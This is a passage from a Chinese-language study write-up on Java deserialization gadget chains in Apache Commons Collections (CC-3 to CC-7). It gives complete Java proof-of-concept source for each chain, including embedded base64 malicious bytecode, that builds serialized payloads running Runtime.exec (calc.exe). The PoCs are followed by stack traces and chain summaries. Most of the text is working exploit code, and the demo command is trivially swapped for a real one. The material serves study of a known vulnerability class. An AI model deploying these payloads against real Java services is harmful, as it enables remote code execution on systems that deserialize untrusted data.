    byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");  
    ​  
    // 设置属性  
    TemplatesImpl templates = new TemplatesImpl();  
    setFieldValue(templates, "_bytecodes", new byte[][]{code});  
    setFieldValue(templates, "_name", "HelloTemplatesImpl");  
    setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
    ​  
    // transformers对象  
    Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(TrAXFilter.class),  
    new InstantiateTransformer(  
    new Class[]{Templates.class},  
    new Object[]{templates}  
    )  
    };  
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
    ​  
    // LazyMap实例  
    Map uselessMap = new HashMap();  
    Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);  
    ​  
    // JDK动态代理技术  
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  
    constructor.setAccessible(true);  
    InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);  
    Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);  
    InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);  
    ​  
    // 序列化利用链  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(baos);  
    oos.writeObject(handler1);  
    oos.flush();  
    oos.close();  
    ​  
    // 序列化测试  
    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(bais);  
    ois.readObject();  
    ois.close();  
    ​  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    ​  
    }  
    ​  
    ​  
    // 反射设置对象成员属性  
    public static void setFieldValue(Object object, String fieldName, Object value) {  
    try {  
    Field field = object.getClass().getDeclaredField(fieldName);  
    field.setAccessible(true);  
    field.set(object, value);  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    }  
    ​  
    }

## 3、分析

    
    
    getTransletInstance:387, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  
    newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  
    <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)  
    // TrAXFilter有参构造  
    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)  
    newInstance:57, NativeConstructorAccessorImpl (sun.reflect)  
    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)  
    newInstance:526, Constructor (java.lang.reflect)  
    transform:106, InstantiateTransformer (org.apache.commons.collections.functors)  
    // InstantiateTransformer.transform方法：newInstance前一元素（TrAXFilter），  
    // 并以后一元素的iArgs属性（templates）作为参数!!!!  
    transform:123, ChainedTransformer (org.apache.commons.collections.functors)  
    get:158, LazyMap (org.apache.commons.collections.map)  
    invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)  
    // 执行调用处理器的Invoke方法  
    entrySet:-1, $Proxy0 (com.sun.proxy)  
    // 执行方法代理mapProxy的entrySet方法  
    readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)  
    // AnnotationInvocationHandler的反序列化过程  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:57, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:606, Method (java.lang.reflect)  
    invokeReadObject:1017, ObjectStreamClass (java.io)  
    readSerialData:1893, ObjectInputStream (java.io)  
    readOrdinaryObject:1798, ObjectInputStream (java.io)  
    readObject0:1350, ObjectInputStream (java.io)  
    readObject:370, ObjectInputStream (java.io)  
    main:69, Cc3 (org.example)  
    // 执行JDK的反序列化过程

利用链：AnnotationInvocationHandler——>$Proxy0——>AnnotationInvocationHandler——>LazyMap——>ChainedTransformer——>InstantiateTransformer——>TrAXFilter——>TemplatesImpl

CC1的实现技术（JDK动态代理），以 **InstantiateTransformer** 类的 _transform_ 方法与
**TrAXFilter** 类的 _构造方法_ 衔接至CC2触发位置，形成CC3。

# CC-4

## 1、测试环境

  * CommonsCollections：4

  * JDk小于等于7u21

## 2、Poc

    
    
    package org.example;  
    ​  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
    import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;  
    import org.apache.commons.collections4.Transformer;  
    import org.apache.commons.collections4.comparators.TransformingComparator;  
    import org.apache.commons.collections4.functors.ChainedTransformer;  
    import org.apache.commons.collections4.functors.ConstantTransformer;  
    import org.apache.commons.collections4.functors.InstantiateTransformer;  
    ​  
    import javax.xml.transform.Templates;  
    import java.io.ByteArrayInputStream;  
    import java.io.ByteArrayOutputStream;  
    import java.io.ObjectInputStream;  
    import java.io.ObjectOutputStream;  
    import java.lang.reflect.Field;  
    import java.util.PriorityQueue;  
    ​  
    ​  
    public class Cc4 {  
    ​  
    public static void main(String[] args) {  
    ​  
    try {  
    // 字节码  
    byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");  
    ​  
    // 设置属性  
    TemplatesImpl templates = new TemplatesImpl();  
    setFieldValue(templates, "_bytecodes", new byte[][]{code});  
    setFieldValue(templates, "_name", "HelloTemplatesImpl");  
    setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
    ​  
    // 构造比较器  
    Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(TrAXFilter.class),  
    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})  
    };  
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
    TransformingComparator comparator = new TransformingComparator(chainedTransformer);  
    ​  
    // priorityQueue容器  
    PriorityQueue priorityQueue = new PriorityQueue(2);  
    priorityQueue.add(1);  
    priorityQueue.add(1);  
    ​  
    // 反射设置 Field  
    Object[] objects = new Object[]{templates, templates};  
    setFieldValue(priorityQueue, "queue", objects);  
    setFieldValue(priorityQueue, "comparator", comparator);  
    ​  
    // 序列化序列化利用链  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(baos);  
    oos.writeObject(priorityQueue);  
    oos.flush();  
    oos.close();  
    ​  
    // 反序列化测试  
    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(bais);  
    ois.readObject();  
    ois.close();  
    ​  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    ​  
    }  
    ​  
    ​  
    // 反射设置对象成员属性  
    public static void setFieldValue(Object object, String fieldName, Object value) {  
    try {  
    Field field = object.getClass().getDeclaredField(fieldName);  
    field.setAccessible(true);  
    field.set(object, value);  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    }  
    ​  
    }

## 3、分析

    
    
    getTransletInstance:387, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  
    newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  
    <init>:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)  
    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)  
    newInstance:57, NativeConstructorAccessorImpl (sun.reflect)  
    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)  
    newInstance:526, Constructor (java.lang.reflect)  
    transform:116, InstantiateTransformer (org.apache.commons.collections4.functors)  
    transform:32, InstantiateTransformer (org.apache.commons.collections4.functors)  
    transform:112, ChainedTransformer (org.apache.commons.collections4.functors)  
    compare:81, TransformingComparator (org.apache.commons.collections4.comparators)  
    siftDownUsingComparator:699, PriorityQueue (java.util)  
    siftDown:667, PriorityQueue (java.util)  
    heapify:713, PriorityQueue (java.util)  
    readObject:773, PriorityQueue (java.util)  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:57, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:606, Method (java.lang.reflect)  
    invokeReadObject:1017, ObjectStreamClass (java.io)  
    readSerialData:1893, ObjectInputStream (java.io)  
    readOrdinaryObject:1798, ObjectInputStream (java.io)  
    readObject0:1350, ObjectInputStream (java.io)  
    readObject:370, ObjectInputStream (java.io)  
    main:64, Cc4 (org.example)

利用链：PriorityQueue——>TransformingComparator——>ChainedTransformer——>InstantiateTransformer——>TrAXFilter——>TemplatesImpl

由于CommonsCollections4的InvokerTransformer不可序列化，所以此处是由CC-2的利用链变换而成。

# CC-5

## 1、测试环境

  * CommonsCollections：3.1-3.2.1

  * JDK 8

## 2、Poc

    
    
    package org.example;  
    ​  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.keyvalue.TiedMapEntry;  
    import org.apache.commons.collections.map.LazyMap;  
    ​  
    import javax.management.BadAttributeValueExpException;  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.HashMap;  
    import java.util.Map;  
    ​  
    public class Cc5 {  
    ​  
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {  
    ​  
    // 命令  
    Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",   
    new Class[] {String.class, Class[].class },   
    new Object[] {"getRuntime", new Class[0] }),  
    new InvokerTransformer("invoke",   
    new Class[] {Object.class, Object[].class },   
    new Object[] {null, new Object[0] }),  
    new InvokerTransformer("exec",   
    new Class[] {String.class },   
    new Object[] {"calc.exe"})  
    };  
    Transformer chainedTransformer = new ChainedTransformer(transformers);  
    Map uselessMap = new HashMap();  
    Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);  
    ​  
    // bave.readObject()方法过度到lazyMap的中间对象  
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");  
    ​  
    // BadAttributeValueExpException重写了readObject（）  
    BadAttributeValueExpException bave = new BadAttributeValueExpException(null);  
    ​  
    // 反射设置 val  
    Field val = BadAttributeValueExpException.class.getDeclaredField("val");  
    val.setAccessible(true);  
    val.set(bave, tiedMapEntry);  
    ​  
    // 序列化  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(baos);  
    oos.writeObject(bave);  
    oos.flush();  
    oos.close();  
    ​  
    // 反序列化测试  
    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(bais);  
    ois.readObject();  
    ois.close();  
    ​  
    }  
    ​  
    }

## 3、分析

    
    
    transform:126, InvokerTransformer (org.apache.commons.collections.functors)  
    transform:123, ChainedTransformer (org.apache.commons.collections.functors)  
    get:158, LazyMap (org.apache.commons.collections.map)  
    getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)  
    toString:132, TiedMapEntry (org.apache.commons.collections.keyvalue)  
    readObject:86, BadAttributeValueExpException (javax.management)  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:62, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:498, Method (java.lang.reflect)  
    invokeReadObject:1185, ObjectStreamClass (java.io)  
    readSerialData:2345, ObjectInputStream (java.io)  
    readOrdinaryObject:2236, ObjectInputStream (java.io)  
    readObject0:1692, ObjectInputStream (java.io)  
    readObject:508, ObjectInputStream (java.io)  
    readObject:466, ObjectInputStream (java.io)  
    main:52, Cc5 (org.example)

利用链：BadAttributeValueExpException——>TiedMapEntry——>LazyMap——>ChainedTransformer——>InvokerTransformer

利用 **BadAttributeValueExpException** 重写的readObject方法，借助
**TiedMapEntry类、LazyMap类** 传递调用关系，最终执行ChainedTransformer.transform。

# CC-6

## 1、测试环境

  * CommonsCollections：3.1-3.2.1

  * JDK 7、8

## 2、Poc

    
    
    package org.example;  
    ​  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.keyvalue.TiedMapEntry;  
    import org.apache.commons.collections.map.LazyMap;  
    ​  
    import java.io.ByteArrayInputStream;  
    import java.io.ByteArrayOutputStream;  
    import java.io.ObjectInputStream;  
    import java.io.ObjectOutputStream;  
    import java.lang.reflect.Field;  
    import java.util.HashMap;  
    import java.util.Map;  
    ​  
    public class Cc6 {  
    ​  
    public static void main(String[] args) throws Exception {  
    ​  
    // 命令  
    Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",  
    new Class[]{String.class, Class[].class},  
    new Object[]{"getRuntime", new Class[0]}),  
    new InvokerTransformer("invoke",  
    new Class[]{Object.class, Object[].class},  
    new Object[]{null, new Object[0]}),  
    new InvokerTransformer("exec",  
    new Class[]{String.class},  
    new Object[]{"calc.exe"})  
    };  
    // 空chainedTransformer  
    Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});  
    // 构造空利用链  
    Map uselessMap = new HashMap();  
    Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);  
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test");  
    HashMap hashMap = new HashMap();  
    hashMap.put(tiedMapEntry, "test");  
    /*  
    * 为避免在构建利用链时时触发漏洞，选择先构建空利用链,然后再将transformers通过反射  
    * 机制加载到空利用链对象hashtable中chainedTransformer的成员属性iTransformers上。  
    * */  
    Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");  
    field.setAccessible(true);  
    field.set(chainedTransformer, transformers);  
    ​  
    /*  
    * 清空LazyMap对象，否则反序列化时程序会执行到其他分支中而不会触发利用链  
    * 此语句会触发漏洞，原因未知  
    * */  
    lazyMap.clear();  
    ​  
    // 序列化利用链  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(baos);  
    oos.writeObject(hashMap);  
    oos.flush();  
    oos.close();  
    ​  
    // 反序列化测试  
    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(bais);  
    ois.readObject();  
    ois.close();  
    }  
    }

## 3、分析

    
    
    transform:126, InvokerTransformer (org.apache.commons.collections.functors)  
    transform:123, ChainedTransformer (org.apache.commons.collections.functors)  
    get:158, LazyMap (org.apache.commons.collections.map)  
    getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)  
    hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)  
    hash:340, HashMap (java.util)  
    readObject:1419, HashMap (java.util)  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:62, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:498, Method (java.lang.reflect)  
    invokeReadObject:1185, ObjectStreamClass (java.io)  
    readSerialData:2345, ObjectInputStream (java.io)  
    readOrdinaryObject:2236, ObjectInputStream (java.io)  
    readObject0:1692, ObjectInputStream (java.io)  
    readObject:508, ObjectInputStream (java.io)  
    readObject:466, ObjectInputStream (java.io)  
    main:60, Cc6 (org.example)

利用链：HashMap——>TiedMapEntry——>LazyMap——>ChainedTransformer——>InvokerTransformer

利用 **HashMap类** 的readObject操作键值时需要计算hash值的机会，通过
**TiedMapEntry类与LazyMap类自己的相关方法** 传递调用关系，最终执行chainedTransformer的transform。

# CC-7

## 1、测试环境

  * CommonsCollections：3.1-3.2.1

  * JDK 7、8

## 2、Poc

    
    
    package org.example;  
    ​  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.map.LazyMap;  
    ​  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.HashMap;  
    import java.util.Hashtable;  
    import java.util.Map;  
    ​  
    public class Cc7 {  
    ​  
    public static void main(String[] args) throws Exception {  
    ​  
    //命令  
    Transformer[] transformers = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod",  
    new Class[]{String.class, Class[].class},  
    new Object[]{"getRuntime", new Class[0]}),  
    new InvokerTransformer("invoke",  
    new Class[]{Object.class, Object[].class},  
    new Object[]{null, new Object[0]}),  
    new InvokerTransformer("exec",  
    new Class[]{String.class},  
    new Object[]{"calc.exe"})  
    };  
    ​  
    //空chainedTransformer对象  
    Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});  
    ​  
    //LazyMap实例  
    Map innerMap1 = new HashMap();  
    Map innerMap2 = new HashMap();  
    ​  
    Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);  
    lazyMap1.put("yy", 1);  
    ​  
    Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);  
    lazyMap2.put("zZ", 1);  
    ​  
    Hashtable hashtable = new Hashtable();  
    hashtable.put(lazyMap1, "test");  
    hashtable.put(lazyMap2, "test");  
    /*  
    * 为避免在构建利用链时时触发漏洞，选择先构建空利用链,然后再将transformers通过反射  
    * 机制加载到空利用链对象hashtable中chainedTransformer的成员属性iTransformers上。  
    * */  
    Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");  
    field.setAccessible(true);  
    field.set(chainedTransformer, transformers);  
    /*  
    * hashtable.put会使得lazyMap2增加一个yy->yy,需要移除否则不会触发漏洞  
    * */  
    lazyMap2.remove("yy");  
    ​  
    // 序列化利用链  
    ByteArrayOutputStream baos = new ByteArrayOutputStream();  
    ObjectOutputStream oos = new ObjectOutputStream(baos);  
    oos.writeObject(hashtable);  
    oos.flush();  
    oos.close();  
    ​  
    // 反序列化测试  
    ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
    ObjectInputStream ois = new ObjectInputStream(bais);  
    ois.readObject();  
    ois.close();  
    }  
    }

## 3、分析

    
    
    transform:126, InvokerTransformer (org.apache.commons.collections.functors)  
    transform:123, ChainedTransformer (org.apache.commons.collections.functors)  
    get:158, LazyMap (org.apache.commons.collections.map)  
    equals:460, AbstractMap (java.util)  
    equals:130, AbstractMapDecorator (org.apache.commons.collections.map)  
    reconstitutionPut:1025, Hashtable (java.util)  
    readObject:998, Hashtable (java.util)  
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
    invoke:57, NativeMethodAccessorImpl (sun.reflect)  
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
    invoke:606, Method (java.lang.reflect)  
    invokeReadObject:1017, ObjectStreamClass (java.io)  
    readSerialData:1893, ObjectInputStream (java.io)  
    readOrdinaryObject:1798, ObjectInputStream (java.io)  
    readObject0:1350, ObjectInputStream (java.io)  
    readObject:370, ObjectInputStream (java.io)  
    main:70, Cc7 (org.example)

利用链：Hashtable——>AbstractMapDecorator——>AbstractMap——>LazyMap——>ChainedTransformer——>InvokerTransformer

HashTable.readObject()会读取序列化流数据，重新恢复（生成）被序列化的对象。因此在Poc中，`hashtable`需要put两次以使程序进入readObject方法for循环。

    
    
    private void readObject(java.io.ObjectInputStream s)  
    throws IOException, ClassNotFoundException  
    {  
    ......  
    // 读取元素的数量，然后读取所有键/值对象，elements代表元素数量。  
    for (; elements > 0; elements--) {  
    K key = (K)s.readObject();  
    V value = (V)s.readObject();  
    // synch could be eliminated for performance  
    reconstitutionPut(newTable, key, value);  
    }  
    ......  
    }

`reconstitutionPut`是HashTable重构的put方法，在put时需要解决key的哈希碰撞问题，因此会调用Entry（LazyMap）的equals方法，最终实现漏洞利用。

    
    
    private void reconstitutionPut(Entry<K,V>[] tab, K key, V value)  
    throws StreamCorruptedException  
    {  
    ......  
    for (Entry<K,V> e = tab[index] ; e != null ; e = e.next) {  
    if ((e.hash == hash) && e.key.equals(key)) {  
    throw new java.io.StreamCorruptedException();  
    }  
    }  
    ......  
    }

# 总结

CommonsCollections7条利用链都是在获得程序执行权限的基础上进行构造的，因此在漏洞挖掘时首先要寻找的就是有调用`invoke`、`newInstance`等方法的目标方法。然后以此为基础寻找调用目标方法的方法，循环整个过程直到寻找到满足要求的类。

  * 利用链

  1. AnnotationInvocationHandler——>$Proxy0——>AnnotationInvocationHandler——>LazyMap——>ChainedTransformer——>InvokerTransformer

  2. PriorityQueue——>TransformingComparator——>InvokerTransformer——>TemplatesImpl

  3. AnnotationInvocationHandler——>$Proxy0——>AnnotationInvocationHandler——>LazyMap——>ChainedTransformer——>InstantiateTransformer——>TrAXFilter——>TemplatesImpl

  4. PriorityQueue——>TransformingComparator——>ChainedTransformer——>InstantiateTransformer——>TrAXFilter——>TemplatesImpl

  5. BadAttributeValueExpException——>TiedMapEntry——>LazyMap——>ChainedTransformer——>InvokerTransformer

  6. HashMap——>TiedMapEntry——>LazyMap——>ChainedTransformer——>InvokerTransformer

  7. Hashtable——>AbstractMapDecorator——>AbstractMap——>LazyMap——>ChainedTransformer——>InvokerTransformer

  

# 参考文章

本文为学习归纳，部分内容参考自下列文章，如有错误，多谢指出。

<https://xz.aliyun.com/t/9409#toc-1>

  

